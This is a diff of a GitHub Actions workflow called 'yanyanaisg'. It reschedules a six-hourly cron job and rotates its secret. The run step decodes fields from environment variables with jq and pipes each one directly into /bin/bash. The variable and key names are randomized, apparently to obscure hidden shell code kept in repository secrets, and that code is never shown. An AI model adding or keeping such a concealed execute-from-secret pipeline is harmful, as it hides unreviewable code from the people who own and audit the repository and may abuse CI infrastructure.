@@ -1,9 +1,8 @@
 name: yanyanaisg
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
+    - cron: '39 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanyanaisg
         env:
-          yp09287: ${{ secrets.yp09287 }}
+          hxn7: ${{ secrets.hxn7 }}
         run: |
-          echo $yp09287 | jq -r .axoxj189 | /bin/bash
-          echo $oipfb6781 | jq -r .ggyn4 | /bin/bash
-          echo $sy5 | jq -r .d43 | /bin/bash
-          echo $s511 | jq -r .dlc98 | /bin/bash
-          echo $cfvm404 | jq -r .hhbze1371 | /bin/bash
-          echo $e11590 | jq -r .jm42 | /bin/bash
-          echo $j751 | jq -r .uai1611 | /bin/bash
-          echo $qusoh56388 | jq -r .mwf23113 | /bin/bash
-          echo $its8944 | jq -r .nzcdv26980 | /bin/bash
-          echo $sv843 | jq -r .i97514 | /bin/bash
-          echo $sx4 | jq -r .rr623 | /bin/bash
-          echo $bw067 | jq -r .xdnrc22109 | /bin/bash
-          echo $thcre533 | jq -r .utn87370 | /bin/bash
+          echo $hxn7 | jq -r .p1664 | /bin/bash
+          echo $hfk320 | jq -r .shpx4454 | /bin/bash
+          echo $dyp52 | jq -r .m5 | /bin/bash
+          echo $u3556 | jq -r .wbg363 | /bin/bash
+          echo $w3433 | jq -r .pozew14 | /bin/bash
+          echo $el531 | jq -r .yhre813 | /bin/bash
+          echo $cosvw5870 | jq -r .psgrf720 | /bin/bash
+          echo $dysv814 | jq -r .zpcng271 | /bin/bash
 
